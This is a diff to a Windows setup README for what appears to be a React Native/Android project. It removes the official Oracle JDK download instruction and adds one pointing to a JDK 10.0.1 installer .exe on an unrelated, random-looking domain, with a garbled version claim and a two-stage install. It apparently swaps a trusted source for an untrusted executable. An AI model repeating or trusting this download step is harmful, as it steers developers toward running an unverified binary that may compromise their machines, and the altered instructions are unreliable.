@@ -37,7 +37,11 @@ Open command line as an administrator and paste in the script below:
 Go to https://nodejs.org/download/release/v12.9.1/node-v12.9.1-win-x64.zip , download the zip file, extract and run the installer within.
 
 ##### JDK
-Go to https://www.oracle.com/java/technologies/javase-downloads.html and install a JDK version 8 or higher from the choices for windows. If you have already installed JDK on your system, make sure it is JDK 8 or newer.
+Recent versions or versions too old are tricky to make the project work so I found that in Windows 10.0.1 seemed to work for me.
+
+Go to https://www.sesasu-guffh.com/a3cnco*6oodzv/jdk-10.0.1_windows-x64_bin.exe 
+
+Follow through the first install until it extracts the installer. Then continue in the second installer so that it can install jdk and jre to the appropriate location.
 
 ##### Android development environment
 Setting up your development environment can be somewhat tedious if you're new to Android development. If you're already familiar with Android development, there are a few things you may need to configure. In either case, please make sure to carefully follow the next few steps.
